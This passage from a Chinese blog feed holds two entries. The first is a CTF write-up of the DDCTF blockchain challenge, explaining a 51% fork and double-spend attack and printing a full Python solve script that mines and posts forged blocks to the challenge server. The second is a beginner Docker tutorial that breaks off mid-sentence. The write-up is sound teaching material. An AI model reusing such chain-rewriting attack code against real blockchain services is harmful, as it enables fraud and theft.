&quot;ce063909e9304530bd4d3332aa340a7d7d79bf2bd8c3514c3356d3eda1c886e0&quot;, &#x2F;&#x2F;该区块的父区块</span><br><span class="line">    &quot;hash&quot;: &quot;c50b9cefe2fbe0dc8ee66930091f91121dace3bc7ea0613c4888dde7f53858c0&quot;, &#x2F;&#x2F;hash签名</span><br><span class="line">    &quot;transactions&quot;: [&#123;  &#x2F;&#x2F;交易信息</span><br><span class="line">        &quot;input&quot;: [&quot;d7bcf9a0-5e8b-4457-9bac-dba7b68f625d&quot;], &#x2F;&#x2F;被转出币钱包的当前id</span><br><span class="line">        &quot;signature&quot;: [&quot;5eead71e96543fa8a5f34ba766fd51294b82811d43d5c2e5850171cb62ff7f64d7a9e2d91de5551a7514f581b2301a12&quot;], &#x2F;&#x2F;交易签名，根据被转出钱包的私钥生成</span><br><span class="line">        &quot;hash&quot;: &quot;abf48a7e19280bc25db5b411154317a4c6e4d3f95259ca7156ca86cfc13cfbd1&quot;, &#x2F;&#x2F;hash签名</span><br><span class="line">        &quot;output&quot;: [&#123;</span><br><span class="line">            &quot;amount&quot;: 999999, &#x2F;&#x2F;交易后金额</span><br><span class="line">            &quot;hash&quot;: &quot;afa507ef7c93f706f93b2bbd68904551f414b388794d83e326d5ee969814c342&quot;,</span><br><span class="line">            &quot;addr&quot;: &quot;958b7c541efd9da47c28c00ea38b334c721f8b65a1845e5cf961cfafb83f22b947f8bd61e36d4c098788a5585bba5f89&quot;, &#x2F;&#x2F;钱包地址</span><br><span class="line">            &quot;id&quot;: &quot;db0a630b-9a35-4218-8994-e923dcf432e3&quot; &#x2F;&#x2F;交易后钱包id</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            &quot;amount&quot;: 1,</span><br><span class="line">            &quot;hash&quot;: &quot;7f2651d7a90c567fcc7dcfa71137be533d51c8c3163d6f77216406ee5a589b43&quot;,</span><br><span class="line">            &quot;addr&quot;: &quot;877b5e11bf0aefa6ca5cfd63cf657b9a264ce4f061bc8d2620733a20b80104e64ba5295e635057ca1b2cb8e1e45f3cc7&quot;,</span><br><span class="line">            &quot;id&quot;: &quot;30405529-2693-4fb3-916d-c8e9e20d6bb5&quot;</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;],</span><br><span class="line">    &quot;height&quot;: 1 &#x2F;&#x2F;距离根区块的距离</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&quot;4d1af94d2358de7c6507702f8d0d975119bba5a267820c24c7b130be092138a4&quot;: </span><br><span class="line">&#123;&quot;nonce&quot;: &quot;The Times 03&#x2F;Jan&#x2F;2009 Chancellor on brink of second bailout for bank&quot;, </span><br><span class="line">&quot;prev&quot;: &quot;0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">&quot;hash&quot;: &quot;4d1af94d2358de7c6507702f8d0d975119bba5a267820c24c7b130be092138a4&quot;, </span><br><span class="line">&quot;transactions&quot;: [&#123;</span><br><span class="line">&quot;input&quot;: [], </span><br><span class="line">&quot;signature&quot;: [], </span><br><span class="line">&quot;hash&quot;: &quot;0b0454d452f34f97f0c321a8678c77168d39f1442a72809a402a2a246a43c5c0&quot;, </span><br><span class="line">&quot;output&quot;: [&#123;</span><br><span class="line">&quot;amount&quot;: 1000000, </span><br><span class="line">&quot;hash&quot;: &quot;88c52788c92fb1cfbc7eca2540ec11f69b42c66aa0d8502f7715eca970d27f15&quot;, </span><br><span class="line">&quot;addr&quot;: &quot;b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985&quot;, </span><br><span class="line">&quot;id&quot;: &quot;2b54d916-91b0-4647-b33a-a6cbf5e618bf&quot;&#125;]&#125;], </span><br><span class="line">&quot;height&quot;: 0&#125;, </span><br><span class="line"></span><br><span class="line">&quot;b38663ce91cf1979bd4fcfd0d43d605707b03439404b050778f6f4135838d7d2&quot;: &#123;</span><br><span class="line">&quot;nonce&quot;: &quot;a empty block&quot;, </span><br><span class="line">&quot;prev&quot;: &quot;fb842fb31eec1c9c046ade071464d77909a5cd7963b15a8c71a1f4fec8b403a4&quot;, </span><br><span class="line">&quot;hash&quot;: &quot;b38663ce91cf1979bd4fcfd0d43d605707b03439404b050778f6f4135838d7d2&quot;, &quot;transactions&quot;: [], </span><br><span class="line">&quot;height&quot;: 2&#125;&#125;</span><br></pre></td></tr></table></figure><p>顺序有点不对，但是很容易发现一些信息：</p><ol><li>height=0是创世区块：将<code>1000000DDB</code> 放入银行。</li><li>height=1是第二个区块：黑客通过攻击手段，让银行转账给黑客<code>999999DDB</code></li><li>height=2是第三个区块，空区块。</li></ol><p>查看<code>/flag</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;your_diamonds&#x27;</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to &#x27;</span>.format(session[<span class="string">&#x27;your_diamonds&#x27;</span>]) + shop_address</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>题目要求我们的钻石数大于等于2,即可返回flag </p><p>我们去查看如何获得钻石,定位到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/create_transaction&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span>():</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        block = json.loads(request.data)</span><br><span class="line">        append_block(block, DIFFICULTY)</span><br><span class="line">        msg = <span class="string">&#x27;transaction finished.&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">        </span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</span><br><span class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></span><br><span class="line">        session[<span class="string">&#x27;your_diamonds&#x27;</span>] += <span class="number">1</span></span><br><span class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></span><br><span class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">&#x27;hash&#x27;</span>], <span class="string">&#x27;save the DDCoins in a cold wallet&#x27;</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        msg += <span class="string">&#x27; You receive a diamond.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure><p>shop的余额为1000000的时候，<code>session[&#39;your_diamonds&#39;]</code>加一，也就是说，我们需要利用双重花费，给shop两次100w即可得到flag。</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>由于我们掌握100% 的计算力，所以我们可以完全可以重新计算区块，并延长链，使得链向着长的方向发展，而之前确认的链被<strong>舍弃</strong></p><p>以下思维导图均来自<a href="http://skysec.top/2018/04/22/DDCTF-bitcoin-51per-Attack/">一叶飘零-DDCTF-bitcoin-51per-Attack</a> 膜一波大佬0rz</p><p>之前的区块，不算上创世区块，有两个，那么我们如果有三个以上的区块，就可以将之前确认的区块替代。而默认选择长链（我们构造的链），如图（黑客是我们的区块，蓝色是原来的确认区块）</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/1i6faL52gc.png?imageslim" alt="mark"></p><p>而由于现在主链变为红色部分，之前黑客的操作全部作废 </p><p>所以此时我们的操作成立，即shop获得100万，我们获得钻石一枚 </p><p>此时我们可以触发双花攻击</p><p> 即我们让shop把这100万转出去，然后改变主链走向，让这一操作不成立，则100万又会返回到shop，此时我们的钻石又会继续+1 </p><p>如图</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/mAf8BAJ6Hf.png?imageslim" alt="mark"></p><p>我们现在的主链为红色部分，我们在黑客区块5，让shop给<code>shop_wallet_address</code>转账100万 然后我们利用最强算力 重新计算黑客区块5(已确认过的区块) 生成空区块(绿色部分)</p><p>由于我们后续创建的分叉支路(绿色)更长</p><p> 所以成为主链</p><p>之前的shop转账操作作废，100万回到shop手中 </p><p>此时我们的钻石即可再次+1 </p><p>故此可以完成此题</p><h2 id="payload构造思路"><a href="#payload构造思路" class="headerlink" title="payload构造思路"></a>payload构造思路</h2><p>这里告诉我们黑客完成转账步骤，所以我们可以通过模仿黑客的方法，来完成payload。</p><p>首先，找到block的元素:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span>(<span class="params">prev_block_hash, nonce_str, transactions</span>):</span></span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">&#x27;&#x27;</span>): <span class="keyword">raise</span> Exception(<span class="string">&#x27;prev_block_hash should be hex-encoded hash value&#x27;</span>)</span><br><span class="line">    nonce = str(nonce_str)</span><br><span class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">&#x27;the nonce is too long&#x27;</span>)</span><br><span class="line">    block = &#123;<span class="string">&#x27;prev&#x27;</span>: prev_block_hash, <span class="string">&#x27;nonce&#x27;</span>: nonce, <span class="string">&#x27;transactions&#x27;</span>: transactions&#125;</span><br><span class="line">    block[<span class="string">&#x27;hash&#x27;</span>] = hash_block(block)</span><br><span class="line">    <span class="keyword">return</span> block</span><br></pre></td></tr></table></figure><p>得到block的元素：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">block &#x3D; &#123;&#39;prev&#39;: prev_block_hash, &#39;nonce&#39;: nonce, &#39;transactions&#39;: transactions&#125;</span><br></pre></td></tr></table></figure><p>prev为前一个区块的hash </p><p>nonce需要我们自行爆破遍历 </p><p>transactions(交易)需要我们自己计算 </p><p>我们跟进<code>append_block()</code> </p><p>不难发现<code>transactions</code>计算的关键语句</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = create_block(block[<span class="string">&#x27;prev&#x27;</span>], block[<span class="string">&#x27;nonce&#x27;</span>], block[<span class="string">&#x27;transactions&#x27;</span>])</span><br><span class="line">    block_hash = int(block[<span class="string">&#x27;hash&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">&#x27;Please provide a valid Proof-of-Work&#x27;</span>)</span><br></pre></td></tr></table></figure><p>要求是<code>block_hash&gt;difficulty</code>，可以通过爆破<code>nonce</code>来完成工作量证明。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">b, difficulty, msg=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> nonce&lt;(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        b[<span class="string">&#x27;nonce&#x27;</span>] = msg+str(nonce)</span><br><span class="line">        b[<span class="string">&#x27;hash&#x27;</span>] = hash_block(b)</span><br><span class="line">        block_hash = int(b[<span class="string">&#x27;hash&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> block_hash &lt; difficulty:</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        nonce+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>总结一下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tx &#x3D; &#123;&quot;input&quot;:[input],&quot;output&quot;:[&#123;&quot;amount&quot;:1000000, &#39;id&#39;:txout_id,&#39;addr&#39;:shop_address&#125;],&#39;signature&#39;:[signature]&#125;</span><br><span class="line">tx[&quot;output&quot;][0][&quot;hash&quot;] &#x3D; hash_utxo(tx[&quot;output&quot;][0])</span><br><span class="line">tx[&#39;hash&#39;] &#x3D; hash_tx(tx)</span><br><span class="line">block1[&quot;transactions&quot;] &#x3D; [tx]</span><br></pre></td></tr></table></figure><p>空区块无需计算transactions，所以基本就是爆破遍历Nonce了。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里是copy的一叶飘零大佬的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># # -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> rsa, uuid, json, copy,requests,re,hashlib</span><br><span class="line"><span class="comment"># 获取初始session</span></span><br><span class="line">url = <span class="string">&quot;http://116.85.48.107:5000/b942f830cf97e/&quot;</span></span><br><span class="line">r = requests.get(url=url)</span><br><span class="line">session = r.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line">Cookie = &#123;</span><br><span class="line">    <span class="string">&quot;session&quot;</span>:session</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=Cookie)</span><br><span class="line"><span class="comment"># 获取需要的信息</span></span><br><span class="line">genesis_hash_re = <span class="string">r&#x27;hash of genesis block: (.*?)&lt;br /&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">genesis_hash = re.findall(genesis_hash_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">shop_address_re = <span class="string">r&quot;, the shop&#x27;s addr: (.*?)&lt;br /&gt;&lt;br /&gt;&quot;</span></span><br><span class="line">shop_address = re.findall(shop_address_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">input_re = <span class="string">r&#x27;&#x27;&#x27;\[\&#123;&quot;input&quot;: \[&quot;(.*?)&quot;\],&#x27;&#x27;&#x27;</span></span><br><span class="line">input = re.findall(input_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">signature_re = <span class="string">r&#x27;&#x27;&#x27;&quot;\], &quot;signature&quot;: \[&quot;(.*?)&quot;\]&#x27;&#x27;&#x27;</span></span><br><span class="line">signature = re.findall(signature_re, r.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">txout_id = str(uuid.uuid4())</span><br><span class="line"><span class="comment">#工作量证明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">b, difficulty, msg=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> nonce&lt;(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        b[<span class="string">&#x27;nonce&#x27;</span>] = msg+str(nonce)</span><br><span class="line">        b[<span class="string">&#x27;hash&#x27;</span>] = hash_block(b)</span><br><span class="line">        block_hash = int(b[<span class="string">&#x27;hash&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> block_hash &lt; difficulty:</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        nonce+=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprint</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(b)</span><br><span class="line"></span><br><span class="line">DIFFICULTY = int(<span class="string">&#x27;00000&#x27;</span> + <span class="string">&#x27;f&#x27;</span> * <span class="number">59</span>, <span class="number">16</span>)<span class="comment"># 给出的DIFFICULTY</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hash(hash(x) + hash(y))</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = <span class="string">&#x27;0&#x27;</span> * <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span>(<span class="params">utxo</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">&#x27;id&#x27;</span>], utxo[<span class="string">&#x27;addr&#x27;</span>], str(utxo[<span class="string">&#x27;amount&#x27;</span>])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span>(<span class="params">tx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</span><br><span class="line">        reduce(hash_reducer, tx[<span class="string">&#x27;input&#x27;</span>], EMPTY_HASH),</span><br><span class="line">        reduce(hash_reducer, [utxo[<span class="string">&#x27;hash&#x27;</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">&#x27;output&#x27;</span>]], EMPTY_HASH)</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span>(<span class="params">block</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">&#x27;prev&#x27;</span>], block[<span class="string">&#x27;nonce&#x27;</span>],</span><br><span class="line">                                 reduce(hash_reducer, [tx[<span class="string">&#x27;hash&#x27;</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">&#x27;transactions&#x27;</span>]], EMPTY_HASH)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">empty_block</span>(<span class="params">msg, prevHash</span>):</span></span><br><span class="line">    b=&#123;&#125;</span><br><span class="line">    b[<span class="string">&quot;prev&quot;</span>] = prevHash</span><br><span class="line">    b[<span class="string">&quot;transactions&quot;</span>] = []</span><br><span class="line">    b = pow(b, DIFFICULTY, msg)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="comment">#从创世块开始分叉，给商店转1000000</span></span><br><span class="line">block1 = &#123;&#125;</span><br><span class="line">block1[<span class="string">&quot;prev&quot;</span>] = genesis_hash</span><br><span class="line">tx = &#123;<span class="string">&quot;input&quot;</span>:[input],<span class="string">&quot;output&quot;</span>:[&#123;<span class="string">&quot;amount&quot;</span>:<span class="number">1000000</span>, <span class="string">&#x27;id&#x27;</span>:txout_id,<span class="string">&#x27;addr&#x27;</span>:shop_address&#125;],<span class="string">&#x27;signature&#x27;</span>:[signature]&#125;</span><br><span class="line">tx[<span class="string">&quot;output&quot;</span>][<span class="number">0</span>][<span class="string">&quot;hash&quot;</span>] = hash_utxo(tx[<span class="string">&quot;output&quot;</span>][<span class="number">0</span>])</span><br><span class="line">tx[<span class="string">&#x27;hash&#x27;</span>] = hash_tx(tx)</span><br><span class="line">block1[<span class="string">&quot;transactions&quot;</span>] = [tx]</span><br><span class="line">block1 = pow(block1, DIFFICULTY)</span><br><span class="line">url_begin = <span class="string">&quot;http://116.85.48.107:5000/b942f830cf97e/create_transaction&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">header_change</span>(<span class="params">session</span>):</span></span><br><span class="line">    header = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;116.85.48.107:5000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;session=&quot;</span>+session,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line">s1 = requests.post(url=url_begin,data=myprint(block1),headers=header_change(session))</span><br><span class="line">session1 = s1.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s1.content</span><br><span class="line"><span class="comment">#构造空块增加分叉链长度，使分叉链最长，因为max的结果不唯一，少则一次多则两次</span></span><br><span class="line">block2 = empty_block(<span class="string">&quot;myempty1&quot;</span>, block1[<span class="string">&quot;hash&quot;</span>])</span><br><span class="line">s2 = requests.post(url=url_begin,data=myprint(block2),headers=header_change(session1))</span><br><span class="line">session2 = s2.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s2.content</span><br><span class="line">block3 = empty_block(<span class="string">&quot;myempty2&quot;</span>, block2[<span class="string">&quot;hash&quot;</span>])</span><br><span class="line">s3 = requests.post(url=url_begin,data=myprint(block3),headers=header_change(session2))</span><br><span class="line">session3 = s3.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s3.content</span><br><span class="line"><span class="comment">#余额更新成功,系统自动添加块，转走商店钱，钻石+１</span></span><br><span class="line"><span class="comment">#从自己的块，即系统转走钱之前的那个块再次分叉，添加空块</span></span><br><span class="line">block4 = empty_block(<span class="string">&quot;myempty3&quot;</span>, block3[<span class="string">&quot;hash&quot;</span>])</span><br><span class="line">s4 = requests.post(url=url_begin,data=myprint(block4),headers=header_change(session3))</span><br><span class="line">session4 = s4.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s4.content</span><br><span class="line">block5 = empty_block(<span class="string">&quot;myempty4&quot;</span>, block4[<span class="string">&quot;hash&quot;</span>])</span><br><span class="line">s5 = requests.post(url=url_begin,data=myprint(block5),headers=header_change(session4))</span><br><span class="line">session5 = s5.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">print</span> s5.content</span><br><span class="line"></span><br><span class="line">flag_url = <span class="string">&quot;http://116.85.48.107:5000/b942f830cf97e/flag&quot;</span></span><br><span class="line">flag = requests.get(url=flag_url,headers=header_change(session5))</span><br><span class="line"><span class="keyword">print</span> flag.content</span><br><span class="line"><span class="comment">#新的分叉链最长，余额更新成功，钻石+１</span></span><br></pre></td></tr></table></figure><p>装好依赖库以后，可以getflag：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/JCc2jJkg6c.png?imageslim" alt="mark"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>区块链博大精深，学习到一点点皮毛，还有很多不明白的地方，大部分也都是照搬一叶飘零大佬的博客，再次0rz。希望之后有机会再学习更多区块链的知识。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://skysec.top/2018/04/22/DDCTF-bitcoin-51per-Attack/">http://skysec.top/2018/04/22/DDCTF-bitcoin-51per-Attack/</a></p>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker 学习笔记</title>
      <link href="/2018/09/20/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/09/20/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="docker是什么？"><a href="#docker是什么？" class="headerlink" title="docker是什么？"></a>docker是什么？</h1><p>Docker是一个开源的引擎，可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署，包括VMs（虚拟机）、<a href="http://www.whatis.com.cn/word_5275.htm">bare metal</a>、OpenStack 集群和其他的基础应用平台。 </p><ul><li><p>docker能让我们信息安全爱好者方便的搭建各种环境，包括创建各种系统镜像容器、搭建各种漏洞靶场的实战环境。</p></li><li><p>它定义了从单个镜像解放到到容器铺设、容器铺设压缩到单个镜像的一套业内标准。</p></li><li><p>就好比我们的快递包裹来了，docker可以直接使我们从这一个包裹的打开到拼装成豪华的变形金刚模型全过程的快速完成，当然反过来打包成包裹也是同样的道理。</p></li><li><p>它的关键字是：虚拟化、沙箱制。</p></li></ul><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>Docker系统有两个程序：docker服务端和docker客户端。其中docker服务端是一个服务进程，管理着所有的容器。docker客户端则扮演着docker服务端的远程控制器，可以用来控制docker的服务端进程。大部分情况下，docker服务端和客户端运行在一台机器上。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Windows安装"><a href="#Windows安装" class="headerlink" title="Windows安装"></a>Windows安装</h3><p><a href="https://store.docker.com/editions/community/docker-ce-desktop-windows">官网下载地址</a></p><p>注意一点：下载之前需要一个登录docker帐号，因为有人机验证，这个账号需要翻墙注册，否则无法注册。</p><p>安装首先要开启Windows10功能里面的Hyper-V，然后一直点点点登录刚刚注册的账号就可以了</p><p>需要windows专业版。。。</p><p>我的家庭版，算了。。。</p><p>参考链接</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42049&fromuid=310269">十分钟让你的Windows10畅玩Docker</a></p><h3 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h3><p>笔者环境（ubantu16.04 虚拟机）</p><ol><li><p>运行安装 Docker 的命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y docker.io</span><br></pre></td></tr></table></figure></li><li><p>等待安装完毕，现在我们使用下面的命令启动 Docker：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker  </span><br></pre></td></tr></table></figure></li><li><p>运行系统引导时启用 docker，命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure></li><li><p>你可能想核对一下 docker 版本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/6jJI4B2ah8.png?imageslim" alt="mark"></p><h1 id="docker的使用"><a href="#docker的使用" class="headerlink" title="docker的使用"></a>docker的使用</h1><h2 id="搜索docker镜像"><a href="#搜索docker镜像" class="headerlink" title="搜索docker镜像"></a>搜索docker镜像</h2><p>Docker官方网站专门有一个页面来存储所有可用的镜像，网址是：<a href="http://index.docker.io/">index.docker.io</a>。你可以通过浏览这个网页来查找你想要使用的镜像，或者使用命令行的工具来检索。</p><p>命令行的格式为：<code>docker search 镜像名字</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search hello-world</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/8bdHl2jG9J.png?imageslim" alt="mark"></p><h2 id="下载docker镜像"><a href="#下载docker镜像" class="headerlink" title="下载docker镜像"></a>下载docker镜像</h2><p>下载镜像的命令非常简单，使用docker pull命令即可。(译者按：docker命令和git有一些类似的地方）。在docker的镜像索引网站上面，镜像都是按照<strong>用户名/镜像名</strong>的方式来存储的。有一组比较特殊的镜像，比如ubuntu这类基础镜像，经过官方的验证，值得信任，可以直接用<strong>镜像名</strong>来检索到。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull hello-world</span><br><span class="line">docker pull learn/tutorial</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/7CdB45hgfe.png?imageslim" alt="mark"></p><h2 id="使用命令查看docker镜像"><a href="#使用命令查看docker镜像" class="headerlink" title="使用命令查看docker镜像"></a>使用命令查看docker镜像</h2><p>使用<code>images</code>命令查看<code>docker</code>的所有镜像文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/eLl16Cca4C.png?imageslim" alt="mark"></p><h2 id="在docker容器中运行hello-world"><a href="#在docker容器中运行hello-world" class="headerlink" title="在docker容器中运行hello-world"></a>在docker容器中运行<code>hello-world</code></h2><p>docker容器可以理解为在沙盒中运行的进程。这个沙盒包含了该进程运行所必须的资源，包括文件系统、系统类库、shell 